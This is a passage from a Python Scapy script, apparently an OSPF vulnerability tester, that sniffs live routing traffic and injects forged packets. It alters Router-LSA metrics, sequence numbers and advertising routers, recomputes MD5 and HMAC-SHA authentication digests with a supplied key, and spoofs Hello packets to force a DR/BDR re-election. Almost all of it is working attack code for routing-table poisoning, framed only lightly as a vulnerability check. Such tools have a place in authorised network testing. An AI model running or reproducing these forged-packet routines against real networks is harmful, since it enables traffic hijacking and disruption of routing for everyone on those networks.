			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#cut auth data, gen auth seq data, no need for checsum <<<< but what if LSA contain only network-lsa?? check LSTYPE first!!!
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("2sha256activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("debug_2sha512")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)			
	def Six_Persist_attack(): #Done (an updated firmware should send ack back but ignore it.)
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		#print("Please verify that your OSPF fightback mechanism is working by testing on the 1st attack (Seq++ attack). Otherwise, the result will not be valid")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x : #to select only packet with Router_LSA not Network-LSA 
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for LSUpdate
		
		def chkvuln():
			sta6 = "     please check the OSPF Database on the routers, if the RouterID has the above Sequence and checksum resides in the router, consider vulnerable for Persistent Attack"
			print("please check the OSPF Database on the routers, if the RouterID has the above Sequence and checksum resides in the router, consider vulnerable for Persistent Attack")
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			#change metric and send out, reload checksum
			#print("debug_0")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.30.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#change metric and send out, reload checksum
			#print("debug_1")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#cut auth data, gen auth seq data, no need for checsum <<<< but what if LSA contain only network-lsa?? check LSTYPE first!!!
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new)
			chkvuln()
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("2sha256activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("2sha512activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Router_LSA].adrouter = "192.168.248.248"
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			print("Router = " + pkts_atk[lenpkts][OSPF_Router_LSA].id)
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new)
			chkvuln()	
		time.sleep(5)
		main()
		Attacks()
	def Seven_BRBDR_attack(): #Done 
		print("")
		load_contrib('ospf')
		print("This test does not support LLS block, please disable in the router interface before perform the test")
		print("Intercepting Hello, this will take only few seconds")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 1: #to select Hello packet
				return True
			else:
				return False
		pkts_Fsniff=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for Hello packet
		
		def chkvuln():
			def stopfilter(x):
				if x[OSPF_Hdr].type == 1:
					return True
				else:
					return False
			pkts_chk=sniff(filter="ip proto 0x59", stop_filter=stopfilter, timeout=15) 
			try: 
				if pkts_chk[len(pkts_chk)-1][OSPF_Hello].router == NEW_DR_IP_input : 
					print("Current DR is now the input router IP address, vulnerable for DR/BDR Re-Electing Attack")
					sta7 = "     Current DR is now the input router IP address, vulnerable for DR/BDR Re-Electing Attack"
				else: 
					print "Current DR is not the input router IP address, not vulnerable for DR/BDR Re-Electing Attack" 
					sta7 = "     Current DR is not the input router IP address, not vulnerable for DR/BDR Re-Electing Attack"
			except IndexError:
				print"Error, something is wrong, can't sniff Hello Packet" 
			
		
		lenpktsF = len(pkts_Fsniff)-1 #to select the last packet captured from sniffed
		DRouter = pkts_Fsniff[lenpktsF][OSPF_Hello].router
		BDRouter = pkts_Fsniff[lenpktsF][OSPF_Hello].backup
		
		def stopfilter2(x):
			if x[IP].src == BDRouter :
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter = stopfilter2)
		lenpkts = len(pkts_atk)-1
		
		pkts_atk[lenpkts][OSPF_Hello].router = BDRouter
		pkts_atk[lenpkts][IP].src = BDRouter
		pkts_atk[lenpkts][IP].dst = DRouter
		pkts_atk[lenpkts][OSPF_Hello].prio = 255
		
		print ("\n")
		print("Current DR is " + DRouter)
		print("Current BDR is " + BDRouter)
		print ("\n")
		print("Please input IP address of the new prefered DR Cannot be the current DR/BDR and should have priority = 255 and highest IP address among other routers")
		NEW_DR_IP_input = raw_input()
		
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			#print("debug_0")
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			sendp(pkts_atk[lenpkts])
			time.sleep(20)
			
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			sendp(pkts_atk2[lenpkts2])
			time.sleep(20)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#print("debug_1")
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			sendp(pkts_atk[lenpkts])
			time.sleep(20)
			
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			sendp(pkts_atk2[lenpkts2])
			time.sleep(20)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			pkts_atk2[lenpkts2][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			ospf_header_nov4 = pkts_atk2[lenpkts2][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[lenpkts2][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk2[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
